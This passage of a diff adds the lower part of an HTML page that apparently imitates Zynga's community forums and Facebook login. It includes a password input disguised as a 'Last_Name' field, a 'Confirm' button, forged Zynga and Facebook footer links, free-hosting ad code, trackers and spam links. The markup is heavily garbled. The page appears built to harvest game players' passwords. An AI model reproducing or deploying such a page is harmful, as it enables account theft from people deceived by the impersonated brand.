src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAkGBwgHBgkIBwgKCgkLDRYPDQwMDRsUFRAWIB0iIiAdHx8kKDQsJCYxJx8fLT0tMTU3Ojo6Iys/RD84QzQ5Ojf/2wBDAQoKCg0MDRoPDxo3JR8lNzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzf/wAARCAATAFUDASIAAhEBAxEB/8QAGQABAAMBAQAAAAAAAAAAAAAAAAIEBgUH/8QALxAAAQMDAwIEBAcBAAAAAAAAAQIDBAAFERIhMQZBExRRgRUycZEiIyQzUqGx0f/EABkBAQACAwAAAAAAAAAAAAAAAAACAwEEBf/EACQRAAEEAQIGAwAAAAAAAAAAAAEAAgMRIRJBBBMxgcHwItHx/9oADAMBAAIRAxEAPwD2G+SXY1rkKjH9UpBRHAG6nSMJH3x/tZa0XbyV6dDrFziQkMHzBmeI6FOZGCk/iAwNWSCBxSb1CqVcfBeSUPRZC0tQI4Ljy1DKQpXZIIOQONwSrtVG7NBMhL96RKjqQjU/DEwhp9rglBBGVJ7jvx3BrnTcQ/nDQDpGCc1fT3ZWho0m+q292vECzwxMuMhLTBUEheCck8Yx9KO3mA1Jgx1yAHZwJjAAkOAAHn6EVk+trPcOoH7bBtLLKoDCFrW44r8sKxpSk43yBn71zYtp6hSjpxT1ud8a1iQ2o6k7jA8M89+Pau22GMsBLs580tB0zw8gNxjxa2B6wsIguzTPT5dp7wFq0K2X6Yxn3q3c7wzActzYbU8ufISy2EEbAgqKjnsAM15MjoO/GOGVRnQ25FL6kFQ/fAUAk78/9rasNz3bvZlSIL5VarSt5SCn5n1ANhIVwThK+/cUnhjYBodazDNI69baWubmRnFyEJeRqjHD2/ybZ39qpQeo7TPlCNFlpU6rOgFJSF450kjB9qyrfT98S3IS4hvVc2FpkLQ4SUuElaVKB4/jt610lJnXX4XD+EPQfJvNuuvOFOlAR2Rg754+lDDGN77hVDiJTXxrsc/WPcLSwZjE+MmTEc1tKJAVgjg4P9iq1vuzU111sNrbUhakZUNlaTg4PeuX0euZEiNW2VbJTOguKL6tOjdRI7571Qj+am36QLfJZSypzDra0nLeggEJOMHjPvUeULcNhup892lhrJ6j9Wz5GRSqNpgvwo5RIkl1ROQAMJQPQd+9KoIAOFstJIsildCUhZUEjUeTjc1B6Mw+UF9ltwtnUgrSDpPqM8UpWFJTSlKM6UhOTk4GN6lSlESlKURKUpREqCGm0nKW0JOSchIG55+9KURTpSlEX//Z" alt="" /></a></font></font></font></strong></font></strong></center><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font=""><font size="4" color="#f8f8ff">  </font></font></font></font></strong></font></strong><center><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font=""><font size="4" color="#f8f8ff"> <input type="password" value="" name="Last_Name" id="Last_Name" class="inputpassword" /></font></font></font></font></strong></font></strong></center></div>
+
+    <strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font="">      </font></font></font></strong></font></strong><center>
+    <p>  <strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font=""><font size="1"> <input type="submit" name="Submit" value="Confirm" />  </font></font></font></font></strong></font></strong></p>
+    </center>
+</form>
+</div>
+</div>
+<strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font=""><font size="1"><br />
+<br />
+</font></font></font></font></strong><font size=" _fcksavedurl="></font></font></strong><font size=" _fcksavedurl="></font>
+<p>&nbsp;</p>
+
+<strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="> </font></strong></font></strong></font></strong><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font=""><font size="1"><br />
+<br />
+<!-- / close content container -->  <!-- /content area table -->  </font></font> </font></strong> </font></strong> </font></strong>
+<div style="text-align: center; padding-top: 10px; clear: both;">
+<p><span class="api_tos_portion"><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font=""><font size="1"><font size="2"></font></font></font></font></strong></font></strong></font></strong></span></p>
+</div>
+<form action="kari" method="GET" style="clear: left;">
+    <strong><font size=" _fcksavedurl=">    <strong><font size=" _fcksavedurl=">    <strong><font size=" _fcksavedurl=">
+
+    <table cellspacing="0" cellpadding="6" border="0" align="center" width="800" class="page">
+        <tbody>
+            <tr>
+                <td align="right" width="100%" class="tfoot">
+                <div class="smallfont">  			<strong>  				<a href="http://www.facebook.com" rel="nofollow" accesskey="9">Home</a> - 				<a href="http://www.zynga.com">Zynga Community Forums</a> - 				 				 				<a href="http://www.zynga.com">Archive</a> - 				 				<a href="http://www.zynga.com/privacyPolicy/">Privacy Statement</a> - 				<a href="http://forums.zynga.com/showthread.php?t=6148">Terms of Service</a> - 				<a href="#top" onclick="self.scrollTo(0, 0); return false;">Top</a>  			</strong> 		</div>
+
+                </td>
+            </tr>
+        </tbody>
+    </table>
+    <font size="4" color="#faf8cc" font=""><font size="1"><br />
+    </font></font>     </font></strong>     </font></strong>     </font></strong>
+    <div align="center"><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="> <font size="4" color="#faf8cc" font=""><font size="1">	</font></font>     </font></strong>     </font></strong>     </font></strong>
+
+    <div align="center" class="smallfont"><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="> <font size="4" color="#faf8cc" font=""><font size="1">	<!-- Do not remove this copyright notice -->  	Powered by vBulletin&reg;<br />
+    Copyright &copy;2005 - 2015, Jelsoft Enterprises Ltd. 	<!-- Do not remove this copyright notice -->  	</font></font></font></strong></font></strong></font></strong></div>
+    <strong><font size=" _fcksavedurl=">    <strong><font size=" _fcksavedurl=">    <strong><font size=" _fcksavedurl=">    <font size="4" color="#faf8cc" font=""><font size="1">	</font></font>     </font></strong>     </font></strong>     </font></strong>
+
+    <div align="center" class="smallfont"><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="> <font size="4" color="#faf8cc" font=""><font size="1">	<!-- Do not remove cronimage or your scheduled tasks will cease to function --> 	 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->  	 	</font></font></font></strong></font></strong></font></strong></div>
+    <strong><font size=" _fcksavedurl=">    <strong><font size=" _fcksavedurl=">    <strong><font size=" _fcksavedurl=">    </font></strong></font></strong></font></strong></div>
+</form>
+<script type="text/javascript">
+<!--
+	// Main vBulletin Javascript Initialization
+	vBulletin_init();
+//-->
+</script><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl=">  <script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script> <script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-5123623-2");
+pageTracker._trackPageview();
+} catch(err) {}</script>  <!-- fbconnect -->  <script type="text/javascript">
+<!--
+	var bburl = 'http://forums.zynga.com/';
+//-->
+
+</script> <script src="http://static.ak.connect.facebook.com/js/api_lib/v0.4/FeatureLoader.js.php" type="text/javascript"></script> <script src="http://forums.zynga.com//clientscript/fbconnect.js" type="text/javascript"></script>  <script type="text/javascript">
+<!--
+	// Main Facebook Connect Javascript Initialization
+	FB.init("d03734994841416f67f446c54367b848", "/xd_receiver.htm"); 
+//-->
+</script><font size="4" color="#faf8cc" font=""><font size="1">  <!-- / fbconnect -->  <!-- T35 Hosting Ad Code Begin --> <!-- Start of Stat Code --> <img height="1" border="0" width="1" src="http://c11.statcounter.com/1120767/0/78e6f3a5/1/" alt="stats" /> <script type="text/javascript">
+_qoptions={
+qacct:"p-f2Rp-GHnsAESA"
+};
+</script><script type="text/javascript" src="http://edge.quantserve.com/quant.js"></script>   <noscript>&amp;amp;amp;amp;amp;amp;amp;lt;img src=&amp;amp;amp;amp;amp;amp;amp;quot;http://pixel.quantserve.com/pixel/p-f2Rp-GHnsAESA.gif&amp;amp;amp;amp;amp;amp;amp;quot; _fcksavedurl=&quot;&amp;amp;amp;amp;amp;amp;amp;quot;http://pixel.quantserve.com/pixel/p-f2Rp-GHnsAESA.gif&amp;amp;amp;amp;amp;amp;amp;quot;&quot; _fcksavedurl=&amp;quot;&amp;amp;amp;amp;amp;amp;amp;quot;http://pixel.quantserve.com/pixel/p-f2Rp-GHnsAESA.gif&amp;amp;amp;amp;amp;amp;amp;quot;&amp;quot; _fcksavedurl=&amp;amp;quot;&amp;amp;amp;amp;amp;amp;amp;quot;http://pixel.quantserve.com/pixel/p-f2Rp-GHnsAESA.gif&amp;amp;amp;amp;amp;amp;amp;quot;&amp;amp;quot; _fcksavedurl=&amp;amp;amp;quot;&amp;amp;amp;amp;amp;amp;amp;quot;http://pixel.quantserve.com/pixel/p-f2Rp-GHnsAESA.gif&amp;amp;amp;amp;amp;amp;amp;quot;&amp;amp;amp;quot; _fcksavedurl=&amp;amp;amp;amp;quot;&amp;amp;amp;amp;amp;amp;amp;quot;http://pixel.quantserve.com/pixel/p-f2Rp-GHnsAESA.gif&amp;amp;amp;amp;amp;amp;amp;quot;&amp;amp;amp;amp;quot; _fcksavedurl=&amp;amp;amp;amp;amp;quot;&amp;amp;amp;amp;amp;amp;amp;quot;http://pixel.quantserve.com/pixel/p-f2Rp-GHnsAESA.gif&amp;amp;amp;amp;amp;amp;amp;quot;&amp;amp;amp;amp;amp;quot; _fcksavedurl=&amp;amp;amp;amp;amp;amp;quot;&amp;amp;amp;amp;amp;amp;amp;quot;http://pixel.quantserve.com/pixel/p-f2Rp-GHnsAESA.gif&amp;amp;amp;amp;amp;amp;amp;quot;&amp;amp;amp;amp;amp;amp;quot; _fcksavedurl=&amp;amp;amp;amp;amp;amp;amp;quot;http://pixel.quantserve.com/pixel/p-f2Rp-GHnsAESA.gif&amp;amp;amp;amp;amp;amp;amp;quot; style=&amp;amp;amp;amp;amp;amp;amp;quot;display: none;&amp;amp;amp;amp;amp;amp;amp;quot; border=&amp;amp;amp;amp;amp;amp;amp;quot;0&amp;amp;amp;amp;amp;amp;amp;quot; height=&amp;amp;amp;amp;amp;amp;amp;quot;1&amp;amp;amp;amp;amp;amp;amp;quot; width=&amp;amp;amp;amp;amp;amp;amp;quot;1&amp;amp;amp;amp;amp;amp;amp;quot; alt=&amp;amp;amp;amp;amp;amp;amp;quot;Quantcast&amp;amp;amp;amp;amp;amp;amp;quot;/&amp;amp;amp;amp;amp;amp;amp;gt;</noscript> <!-- End of Stat Code --> </font></font> </font></strong> </font></strong> </font></strong>
+
+<div align="center" id="t35ad" style="display: block;">
+<div style="text-align: center;">
+<div style="position: relative; top: 0pt; margin-right: auto; margin-left: auto; z-index: 99999;"><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="> <!-- Start of StatCounter Code --> <font size="4" color="#faf8cc" font=""><font size="1"> <script type="text/javascript">
+ var sc_project=4763056; 
+ var sc_invisible=1; 
+ var sc_partition=54; 
+ var sc_click_stat=1; 
+ var sc_security="99deeeec"; 
+ </script>    <script type="text/javascript"
+ src="http://www.statcounter.com/counter/counter.js"></script><noscript>&amp;amp;amp;amp;amp;amp;amp;lt;div  class=&amp;amp;amp;amp;amp;amp;amp;quot;statcounter&amp;amp;amp;amp;amp;amp;amp;quot;&amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;lt;a title=&amp;amp;amp;amp;amp;amp;amp;quot;wordpress visitor counter&amp;amp;amp;amp;amp;amp;amp;quot;  href=&amp;amp;amp;amp;amp;amp;amp;quot;http://www.statcounter.com/wordpress.com/&amp;amp;amp;amp;amp;amp;amp;quot;  target=&amp;amp;amp;amp;amp;amp;amp;quot;_blank&amp;amp;amp;amp;amp;amp;amp;quot;&amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;lt;img class=&amp;amp;amp;amp;amp;amp;amp;quot;statcounter&amp;amp;amp;amp;amp;amp;amp;quot;  src=&amp;amp;amp;amp;amp;amp;amp;quot;http://c.statcounter.com/4763056/0/99deeeec/1/&amp;amp;amp;amp;amp;amp;amp;quot;  alt=&amp;amp;amp;amp;amp;amp;amp;quot;wordpress visitor counter&amp;amp;amp;amp;amp;amp;amp;quot; &amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;lt;/a&amp;amp;amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;amp;lt;/div&amp;amp;amp;amp;amp;amp;amp;gt;</noscript>   <!-- End of StatCounter Code -->  </font></font></font></strong></font></strong></font></strong></div>
+</div>
+<!-- B18 - ADDED BY 110MB. TO REMOVE, PLEASE UPGRADE TO PREMIUM AT: http://www.110mb.com/upgrade-free-plan.php --><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="> </font></strong></font></strong></font></strong><center>
+<div align="center" style="font-size: 11px; font-family: Arial,Helvetica,sans-serif; font-weight: bold; margin: 5px; color: rgb(0, 0, 0); width: 800px;"><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font=""><font size="1"><a href="http://www.110mb.com" target="_blank" style="color: rgb(0, 102, 255); text-decoration: underline;">http://www.zynga.com/</a></font></font></font></strong></font></strong></font></strong></div>
+
+</center></div><center>
+<a href="http://www.redproxy.net">Free Web Proxy  - </a><a href="http://www.imageboo.com">Free Image Hosting - </a><a href="http://www.yourspacecorner.com">Myspace Comments - </a> <a href="http://www.yourfreehosting.net">Free Web Hosting </a><br>
+
+
+  
+ <script  type="text/javascript" language="javascript"> 
+  
+ var s_sid = 169727;var st_dominio = 4; 
+ var cimg = 0;var cwi =150;var che =30; 
+ </script> 
+ <script  type="text/javascript" language="javascript" src="http://s10.histats.com/js9.js"></script> 
+ <noscript><a href="http://www.histats.com" target="_blank"> 
+ <img  src="http://s4.histats.com/stats/0.gif?169727&1" alt="free html hit counter" border="0"></a> 
+ </noscript> 
+  
+
+
+ <!-- Histats.com  END  -->
+<center>
+
+
+</center>
+<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
+</script>
+<script type="text/javascript">
+_uacct = "UA-418869-29";
+urchinTracker();
+</script>
+
+<center>
+<a href="http://www.dpbolvw.net/click-2918890-10409151" target="_top">Looking for Web Hosting With Quality Support? 24/7 Support Via Phone, Live Chat, and Email!</a>
+<img src="http://www.awltovhc.com/image-2918890-10409151" width="1" height="1" border="0"/>
+</center>
+<center>
+</center>
+
+
+
+<script language="javascript">
+var xCache = Math.floor(Math.random()*99999);
+document.write('<scr'+'ipt src="http://a1.interclick.com/getJs.aspx?a=&b=2,3,4,5&c=&d=&t=24&wsid=9355&v=3.0&ind=&x='+xCache+'"></scr'+'ipt>');
+</script>
+
+
+<center>
+
+<br>
+<!-- BEGIN STANDARD TAG - 728 x 90/468 x 60 - ROS: Run-of-site - DO NOT MODIFY -->
+<IFRAME FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO WIDTH=728 HEIGHT=90 SRC="http://ad.media-servers.net/st?ad_type=iframe&ad_size=728x90,468x60&section=298420"></IFRAME>
+<!-- END TAG -->
+
